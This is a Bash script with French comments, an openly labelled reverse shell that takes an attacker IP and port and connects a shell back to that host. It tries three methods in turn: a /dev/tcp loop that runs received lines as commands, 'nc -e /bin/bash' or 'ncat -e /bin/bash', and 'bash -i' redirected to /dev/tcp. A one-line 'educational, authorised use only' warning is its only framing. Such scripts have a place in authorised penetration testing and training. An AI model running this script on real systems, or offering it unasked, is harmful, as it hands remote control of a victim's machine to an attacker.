#!/bin/bash
# Reverse Shell en Bash 
# Usage: ./reverse_shell_bash.sh <IP_ATTACKER> <PORT>

# Vérification des paramètres
if [ $# -ne 2 ]; then
    echo "Usage: $0 <IP_ATTACKER> <PORT>"
    echo "Exemple: $0 192.168.1.100 4444"
    exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2

echo "[INFO] Tentative de connexion vers $TARGET_IP:$TARGET_PORT"
echo "[WARN] Script éducatif - Utilisez uniquement dans un environnement autorisé"

# Méthode 1: Redirection avec /dev/tcp (fonctionne sur la plupart des systèmes bash)
if [ -e /dev/tcp ]; then
    echo "[INFO] Utilisation de /dev/tcp"
    exec 5<>/dev/tcp/$TARGET_IP/$TARGET_PORT
    cat <&5 | while read line; do $line 2>&5 >&5; done
else
    echo "[INFO] /dev/tcp non disponible, utilisation de netcat"
    # Méthode 2: Avec netcat si disponible
    if command -v nc >/dev/null 2>&1; then
        nc -e /bin/bash $TARGET_IP $TARGET_PORT
    elif command -v ncat >/dev/null 2>&1; then
        ncat -e /bin/bash $TARGET_IP $TARGET_PORT
    else
        # Méthode 3: Méthode alternative sans netcat
        echo "[INFO] Netcat non disponible, méthode alternative"
        bash -i >& /dev/tcp/$TARGET_IP/$TARGET_PORT 0>&1
    fi
fi